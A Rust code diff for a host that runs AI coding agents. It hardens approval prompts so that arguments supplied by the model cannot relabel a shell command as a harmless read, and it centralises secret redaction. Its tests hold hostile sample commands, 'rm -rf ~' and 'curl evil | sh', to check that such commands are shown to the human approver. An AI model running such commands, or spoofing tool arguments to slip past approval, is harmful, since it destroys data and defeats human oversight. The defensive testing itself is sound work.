@@ -83,7 +83,7 @@ use crate::{
     default_workspace, govern_root_env, home_dir, isolate_process_tree,
     kill_isolated_process_tree_blocking, merge_prompt, reap_isolated_process_tree, resolve_program,
     run_subprocess, spawn_parts, spawn_retrying_etxtbsy, try_exit_isolated_process_tree, AuthState,
-    HostDriver, ProbeResult, PromptChannel, SubprocessCall, TerminalTextSanitizer, END_REAP_BUDGET,
+    HostDriver, ProbeResult, SubprocessCall, TerminalTextSanitizer, END_REAP_BUDGET,
 };
 
 const EVENT_CHANNEL_CAP: usize = 256;
@@ -4586,7 +4586,7 @@ async fn dispatch_frame(frame: Value, context: &ReaderContext, tools: &mut ToolS
             | "x.ai/task_completed"
             | QUEUE_CHANGED_METHOD
     );
-    if !has_id && suppress_notification(method, &frame) && !is_consumed_grok_notification {
+    if !has_id && suppress_notification(method) && !is_consumed_grok_notification {
         return;
     }
     dispatch_server_message(&frame, method, normalized.params, has_id, context, tools).await;
@@ -5609,18 +5609,16 @@ async fn handle_permission_request(
             drop(map);
             remember_interaction_owner(&context.interaction_sessions, &req_id, params).await;
             let tool = params.get("toolCall").unwrap_or(&Value::Null);
-            let input = sanitize_value(
-                tool.get("rawInput")
-                    .cloned()
-                    .unwrap_or_else(|| tool.clone()),
-            );
+            // The approval subject comes from the raw input: the trust policy
+            // must classify exactly what the agent will run.
+            let input = tool.get("rawInput").unwrap_or(tool);
             emit_event(
                 &context.event_tx,
                 SessionEvent::HostRequest {
                     req_id,
                     request: HostRequest::Approval {
                         action: tool_name(tool),
-                        target: tool_target(&input),
+                        target: approval_target(tool, input),
                         message: tool
                             .get("title")
                             .and_then(Value::as_str)
@@ -6115,11 +6113,11 @@ async fn remember_interaction_owner(
 async fn emit_event(event_tx: &mpsc::Sender<SessionEvent>, event: SessionEvent) {
     match event {
         // High-volume presentation deltas are intentionally lossy. Every other
-        // event carries session, tool, approval, lifecycle, or terminal state and
-        // therefore must apply bounded backpressure instead of disappearing when
-        // the 256-slot queue is full.
-        SessionEvent::TextDelta(_)
-        | SessionEvent::ThinkingDelta(_)
+        // event — including `TextDelta`, which IS the answer the agent builds
+        // replies and verdicts from — carries state and therefore must apply
+        // bounded backpressure instead of disappearing when the 256-slot queue
+        // is full.
+        SessionEvent::ThinkingDelta(_)
         | SessionEvent::ToolOutputDelta(_)
         | SessionEvent::ToolOutputDeltaCorrelated { .. } => {
             let _ = event_tx.try_send(event);
@@ -7243,7 +7241,7 @@ fn normalized_tool_input(update: &Value) -> Value {
             }
         }
     }
-    sanitize_value(input)
+    input
 }
 
 fn append_grok_bash_tail(update: &mut Option<GrokBashUpdate>, tail: String) {
@@ -7309,49 +7307,92 @@ fn text_from_content(value: &Value) -> Option<String> {
         .or_else(|| value.pointer("/content/content/text"))
         .or_else(|| value.get("text"))
         .and_then(Value::as_str)
-        .map(|text| clip_text(&redact_text(text), MAX_STREAM_DELTA_CHARS))
+        .map(|text| clip_text(text, MAX_STREAM_DELTA_CHARS))
 }
 
+/// The action a tool call names, from vendor-owned fields only.
+///
+/// The ACP `kind` wins, then a vendor `name`/`toolName`, then the `title`.
+/// `rawInput` is never consulted: it carries the model's own arguments, and an
+/// approval's action decides both what the human is shown and how the trust
+/// policy classifies it, so an extra `toolName: "Read"` argument on a shell call
+/// must not turn it into a read.
 fn tool_name(value: &Value) -> String {
-    if let Some(name) = value
-        .get("name")
-        .or_else(|| value.get("toolName"))
-        .or_else(|| value.pointer("/rawInput/toolName"))
-        .and_then(Value::as_str)
-    {
-        return clip_text(&redact_text(name), 80);
-    }
-    let name = match value.get("kind").and_then(Value::as_str).unwrap_or("") {
-        "read" => "Read",
-        "edit" => "Edit",
-        "delete" => "Delete",
-        "move" => "Move",
-        "search" => "Grep",
-        "execute" => "Bash",
-        "fetch" => "WebFetch",
-        "think" => "Think",
-        _ => value.get("title").and_then(Value::as_str).unwrap_or("tool"),
+    let kind_name = match value.get("kind").and_then(Value::as_str).unwrap_or("") {
+        "read" => Some("Read"),
+        "edit" => Some("Edit"),
+        "delete" => Some("Delete"),
+        "move" => Some("Move"),
+        "search" => Some("Grep"),
+        "execute" => Some("Bash"),
+        "fetch" => Some("WebFetch"),
+        "think" => Some("Think"),
+        _ => None,
     };
-    clip_text(&redact_text(name), 80)
+    let name = kind_name
+        .or_else(|| {
+            value
+                .get("name")
+                .or_else(|| value.get("toolName"))
+                .or_else(|| value.get("title"))
+                .and_then(Value::as_str)
+        })
+        .unwrap_or("tool");
+    clip_text(name, 80)
 }
 
+const TOOL_TARGET_KEYS: [&str; 9] = [
+    "file_path",
+    "filePath",
+    "path",
+    "command",
+    "cmd",
+    "query",
+    "url",
+    "target",
+    "title",
+];
+
+/// The one-line detail of a tool row, clipped for display.
 fn tool_target(input: &Value) -> String {
-    for key in [
-        "file_path",
-        "filePath",
-        "path",
-        "command",
-        "cmd",
-        "query",
-        "url",
-        "target",
-        "title",
-    ] {
-        if let Some(value) = input.get(key).and_then(Value::as_str) {
-            return clip_text(&redact_text(value), 180);
+    clip_text(
+        &first_target(input, &TOOL_TARGET_KEYS).unwrap_or_default(),
+        180,
+    )
+}
+
+fn first_target(input: &Value, keys: &[&str]) -> Option<String> {
+    keys.iter()
+        .find_map(|key| input.get(*key).and_then(Value::as_str))
+        .map(str::to_string)
+}
+
+/// The target of a permission request, chosen by what the tool will do.
+///
+/// `input` is the model's own arguments, so its keys cannot be trusted to name
+/// the salient one: a shell call that also carries `path: "src/lib.rs"` must be
+/// shown and classified by its command, not the path. The vendor `kind` picks
+/// which keys count. Without a known kind a command wins over everything else,
+/// since running it is the most any request can do. A shell call with no
+/// command string shows its whole input rather than nothing, so neither the
+/// human nor the trust policy is asked to approve an empty target. The target
+/// is neither redacted nor clipped: whatever the policy does not see, it
+/// cannot classify.
+fn approval_target(tool: &Value, input: &Value) -> String {
+    const COMMAND: [&str; 2] = ["command", "cmd"];
+    let preferred: &[&str] = match tool.get("kind").and_then(Value::as_str).unwrap_or("") {
+        "read" | "edit" | "delete" | "move" => &["file_path", "filePath", "path"],
+        "search" => &["query", "pattern", "path"],
+        "fetch" => &["url", "query"],
+        "think" => &[],
+        "execute" => {
+            return first_target(input, &COMMAND).unwrap_or_else(|| input.to_string());
         }
-    }
-    String::new()
+        _ => &COMMAND,
+    };
+    first_target(input, preferred)
+        .or_else(|| first_target(input, &TOOL_TARGET_KEYS))
+        .unwrap_or_default()
 }
 
 fn grok_bash_raw_output(update: &Value) -> Option<&Value> {
@@ -7389,14 +7430,12 @@ fn grok_bash_stream_delta(
                 stream.reset();
                 Some(GrokBashUpdate::Snapshot(String::new()))
             } else {
-                Some(GrokBashUpdate::Append(redact_text(&stream.append(&bytes))))
+                Some(GrokBashUpdate::Append(stream.append(&bytes)))
             }
         }
         Some(Value::Null) | None => {
             let bytes = json_byte_array(raw.get("output")?.as_array()?)?;
-            Some(GrokBashUpdate::Snapshot(redact_text(
-                &stream.replace(&bytes),
-            )))
+            Some(GrokBashUpdate::Snapshot(stream.replace(&bytes)))
         }
         Some(_) => None,
     }
@@ -7419,7 +7458,7 @@ fn grok_bash_terminal_summary(raw: &Value) -> String {
         let mut sanitizer = TerminalTextSanitizer::new();
         let mut safe = sanitizer.push(summary.as_bytes());
         safe.push_str(&sanitizer.finish());
-        return clip_text(&redact_text(&safe), MAX_DIAGNOSTIC_CHARS);
+        return clip_text(&safe, MAX_DIAGNOSTIC_CHARS);
     }
 
     if raw
@@ -7460,15 +7499,12 @@ fn tool_output_summary(update: &Value) -> String {
         })
         .collect::<Vec<_>>()
         .join("\n");
-    clip_text(&redact_text(&text), MAX_TOOL_RESULT_CHARS)
+    clip_text(&text, MAX_TOOL_RESULT_CHARS)
 }
 
 fn safe_value_summary(value: &Value) -> String {
-    if contains_sensitive_key(value) {
-        return "[redacted sensitive tool output]".to_string();
-    }
     match value {
-        Value::String(text) => clip_text(&redact_text(text), MAX_TOOL_RESULT_CHARS),
+        Value::String(text) => clip_text(text, MAX_TOOL_RESULT_CHARS),
         Value::Null => String::new(),
         _ => clip_text(&value.to_string(), MAX_TOOL_RESULT_CHARS),
     }
@@ -7963,7 +7999,7 @@ fn permission_response_frame(
     let mut result = json!({"outcome":outcome});
     if let Some(message) = followup_message
         .map(redact_text)
-        .map(|message| clip_text(&message, MAX_PERMISSION_FOLLOWUP_CHARS))
+        .map(|message| clip_text(&message, MAX_PERMISSION_FOLLOWUP_CHARS - 1))
         .filter(|message| !message.trim().is_empty())
     {
         result["_meta"] = json!({"followup_message":message});
@@ -9157,12 +9193,9 @@ fn resolve_grok_windows_native_program(program: &str) -> String {
     } else {
         format!("{program}.exe")
     };
-    let path_dirs = std::env::var_os("PATH")
-        .map(|path| std::env::split_paths(&path).collect::<Vec<_>>())
-        .unwrap_or_default();
     select_grok_windows_native_program(
         &native_name,
-        &path_dirs,
+        &umadev_process::path_lookup::search_dirs(),
         grok_canonical_native_program().as_deref(),
     )
 }
@@ -9205,7 +9238,7 @@ fn grok_canonical_native_program_from(
     let name = if windows { "grok.exe" } else { "grok" };
     let home = grok_home_from(grok_home, home)?;
     let path = home.join("bin").join(name);
-    if !crate::is_spawnable_file(&path) {
+    if !umadev_process::path_lookup::is_spawnable_file(&path) {
         return None;
     }
     path.to_str().map(str::to_string)
@@ -9241,7 +9274,6 @@ async fn version_output(program: &str) -> Option<String> {
         program,
         args: &["--version".to_string()],
         prompt: "",
-        channel: PromptChannel::Stdin,
         workspace: &workspace,
         timeout: Duration::from_secs(10),
         env: &[],
@@ -9255,68 +9287,19 @@ async fn version_output(program: &str) -> Option<String> {
         .map(|line| clip_text(line.trim(), 200))
 }
 
-fn suppress_notification(method: &str, frame: &Value) -> bool {
+/// Vendor notifications UmaDev never consumes. Grok's MCP server list carries
+/// each server's environment, so it is dropped unread. Every other
+/// notification is dispatched; one that merely names a sensitive-looking key
+/// (`nextPageToken`, a tool's `env` argument) must still reach the transcript
+/// and governance, with its secret values redacted wherever it is persisted.
+fn suppress_notification(method: &str) -> bool {
     method.starts_with("x.ai/")
         || method.starts_with("_x.ai/")
         || method.ends_with("mcp/servers_updated")
-        || contains_sensitive_key(frame)
-}
-
-fn contains_sensitive_key(value: &Value) -> bool {
-    match value {
-        Value::Object(map) => map
-            .iter()
-            .any(|(key, value)| is_sensitive_key(key) || contains_sensitive_key(value)),
-        Value::Array(values) => values.iter().any(contains_sensitive_key),
-        _ => false,
-    }
-}
-
-fn is_sensitive_key(key: &str) -> bool {
-    let normalized = key
-        .chars()
-        .filter(char::is_ascii_alphanumeric)
-        .flat_map(char::to_lowercase)
-        .collect::<String>();
-    if matches!(
-        normalized.as_str(),
-        "env" | "environment" | "environmentvariables" | "headers" | "httpheaders"
-    ) {
-        return true;
-    }
-    [
-        "token",
-        "accesstoken",
-        "refreshtoken",
-        "authorization",
-        "apikey",
-        "password",
-        "secret",
-        "credential",
-        "cookie",
-        "privatekey",
-    ]
-    .iter()
-    .any(|needle| normalized == *needle || normalized.ends_with(needle))
 }
 
 fn sanitize_value(value: Value) -> Value {
-    match value {
-        Value::Object(map) => Value::Object(
-            map.into_iter()
-                .map(|(key, value)| {
-                    if is_sensitive_key(&key) {
-                        (key, Value::String("[redacted]".to_string()))
-                    } else {
-                        (key, sanitize_value(value))
-                    }
-                })
-                .collect(),
-        ),
-        Value::Array(values) => Value::Array(values.into_iter().map(sanitize_value).collect()),
-        Value::String(text) => Value::String(redact_text(&text)),
-        other => other,
-    }
+    crate::redaction::sanitize_value(value)
 }
 
 fn safe_rpc_error(error: &Value) -> String {
@@ -9335,24 +9318,7 @@ fn safe_rpc_error(error: &Value) -> String {
 }
 
 fn redact_text(text: &str) -> String {
-    let lower = text.to_ascii_lowercase();
-    if [
-        "authorization:",
-        "bearer ",
-        "api_key",
-        "api-key",
-        "access_token",
-        "refresh_token",
-        "password=",
-        "private_key",
-    ]
-    .iter()
-    .any(|needle| lower.contains(needle))
-    {
-        "[redacted sensitive content]".to_string()
-    } else {
-        text.to_string()
-    }
+    crate::redaction::redact_text(text)
 }
 
 fn clip_text(text: &str, max_chars: usize) -> String {
@@ -12661,12 +12627,41 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn text_deltas_survive_a_slow_consumer() {
+        // `TextDelta` IS the answer (the agent builds replies and JSON verdicts
+        // from it), so a full queue must backpressure, never drop a delta.
+        let (event_tx, mut events) = mpsc::channel(EVENT_CHANNEL_CAP);
+        let total = EVENT_CHANNEL_CAP + 10;
+        let producer = tokio::spawn(async move {
+            for index in 0..total {
+                emit_event(&event_tx, SessionEvent::TextDelta(format!("d{index};"))).await;
+            }
+        });
+        let mut received = String::new();
+        while let Some(event) = tokio::time::timeout(Duration::from_secs(2), events.recv())
+            .await
+            .expect("a slow consumer must keep receiving deltas")
+        {
+            if let SessionEvent::TextDelta(delta) = event {
+                received.push_str(&delta);
+            }
+            tokio::time::sleep(Duration::from_millis(1)).await;
+        }
+        producer.await.expect("producer task should not panic");
+        let expected = (0..total).fold(String::new(), |mut expected, index| {
+            std::fmt::Write::write_fmt(&mut expected, format_args!("d{index};")).unwrap();
+            expected
+        });
+        assert_eq!(received, expected);
+    }
+
+    #[tokio::test]
     async fn critical_events_survive_a_slow_consumer_after_a_large_display_burst() {
         let (event_tx, mut events) = mpsc::channel(EVENT_CHANNEL_CAP);
         for index in 0..(EVENT_CHANNEL_CAP + 64) {
             emit_event(
                 &event_tx,
-                SessionEvent::TextDelta(format!("decorative-{index}")),
+                SessionEvent::ThinkingDelta(format!("decorative-{index}")),
             )
             .await;
         }
@@ -14032,57 +14027,61 @@ mod tests {
     }
 
     #[test]
-    fn secret_notifications_are_dropped_recursively_and_values_redacted() {
-        let grok = json!({
-            "method":"_x.ai/mcp/servers_updated",
-            "params":{"servers":[{"env":[
-                {"name":"VENDOR_CREDENTIAL","value":"opaque-value"}
-            ]}]}
-        });
-        assert!(suppress_notification("_x.ai/mcp/servers_updated", &grok));
-        assert!(contains_sensitive_key(&grok));
-        let nested = json!({"method":"vendor/update","params":{"a":{"apiKey":"secret"}}});
-        assert!(suppress_notification("vendor/update", &nested));
+    fn sensitive_key_names_never_drop_updates_and_values_keep_their_shape() {
+        assert!(suppress_notification("_x.ai/mcp/servers_updated"));
+        assert!(!suppress_notification("session/update"));
         let sanitized = sanitize_value(json!({
-            "apiKey":"abc",
+            "apiKey":"abc123",
             "nested":{"password":"p"},
             "env":[{"name":"CUSTOM_KEY","value":"unstructured-secret"}],
-            "headers":{"x-custom-auth":"another-unstructured-secret"},
             "ok":"visible"
         }));
         assert_eq!(sanitized["apiKey"], "[redacted]");
         assert_eq!(sanitized["nested"]["password"], "[redacted]");
-        assert_eq!(sanitized["env"], "[redacted]");
-        assert_eq!(sanitized["headers"], "[redacted]");
+        assert_eq!(sanitized["env"][0]["value"], "[redacted]");
         assert_eq!(sanitized["ok"], "visible");
 
+        // Model text and tool traffic reach the transcript and governance whole.
         let mut tools = ToolState::default();
+        let chunk = "interface User { password: string; apiKey: string }";
         let text = parse_session_update(
             &json!({"update":{
                 "sessionUpdate":"agent_message_chunk",
-                "content":{"type":"text","text":"Authorization: Bearer assistant-secret"}
+                "content":{"type":"text","text":chunk}
             }}),
             &mut tools,
         );
         assert!(matches!(
             text.as_slice(),
-            [SessionEvent::TextDelta(delta)] if !delta.contains("assistant-secret")
+            [SessionEvent::TextDelta(delta)] if delta == chunk
         ));
-
+        let content = "const API_KEY = \"sk-live-0123456789abcdefghij\";";
         let tool = parse_session_update(
             &json!({"update":{
                 "sessionUpdate":"tool_call",
-                "toolCallId":"safe-correlation-id",
-                "title":"Authorization: Bearer tool-title-secret",
-                "rawInput":{}
+                "toolCallId":"call-1",
+                "kind":"edit",
+                "rawInput":{"path":"src/config.ts","content":content}
             }}),
             &mut tools,
         );
         assert!(matches!(
             tool.as_slice(),
-            [SessionEvent::ToolCallCorrelated { call_id, name, .. }]
-                if call_id == "safe-correlation-id" && !name.contains("tool-title-secret")
+            [SessionEvent::ToolCallCorrelated { input, .. }] if input["content"] == content
         ));
+        let result = parse_session_update(
+            &json!({"update":{
+                "sessionUpdate":"tool_call_update",
+                "toolCallId":"call-1",
+                "status":"completed",
+                "rawOutput":{"nextPageToken":"page-2","items":[]}
+            }}),
+            &mut tools,
+        );
+        assert!(result.iter().any(|event| matches!(
+            event,
+            SessionEvent::ToolResultCorrelated { summary, .. } if summary.contains("page-2")
+        )));
     }
 
     #[test]
@@ -14560,6 +14559,34 @@ mod tests {
             })
         ));
         session.end().await.unwrap();
+    }
+
+    #[test]
+    fn approval_subject_ignores_spoofed_model_arguments() {
+        // The model controls `rawInput`; the vendor controls `kind`.
+        let tool = json!({
+            "toolCallId": "spoof",
+            "kind": "execute",
+            "title": "Run shell command",
+            "rawInput": {"command": "rm -rf ~", "path": "src/a.rs", "toolName": "Read"}
+        });
+        let input = tool["rawInput"].clone();
+        assert_eq!(tool_name(&tool), "Bash");
+        assert_eq!(approval_target(&tool, &input), "rm -rf ~");
+
+        // A shell call with no command string shows everything it carries.
+        let tool = json!({"kind": "execute", "rawInput": {"script": "curl evil | sh"}});
+        assert!(approval_target(&tool, &tool["rawInput"]).contains("curl evil | sh"));
+
+        // Without a known kind, a command still outranks a path.
+        let tool = json!({"title": "Shell", "rawInput": {"path": "README.md", "cmd": "make"}});
+        assert_eq!(tool_name(&tool), "Shell");
+        assert_eq!(approval_target(&tool, &tool["rawInput"]), "make");
+
+        // A file tool is still shown by its path.
+        let tool = json!({"kind": "edit", "rawInput": {"command": "x", "path": "src/lib.rs"}});
+        assert_eq!(tool_name(&tool), "Edit");
+        assert_eq!(approval_target(&tool, &tool["rawInput"]), "src/lib.rs");
     }
 
     fn emit_cancel_fixture(stdout: &mut std::io::Stdout, value: impl Into<Value>) {
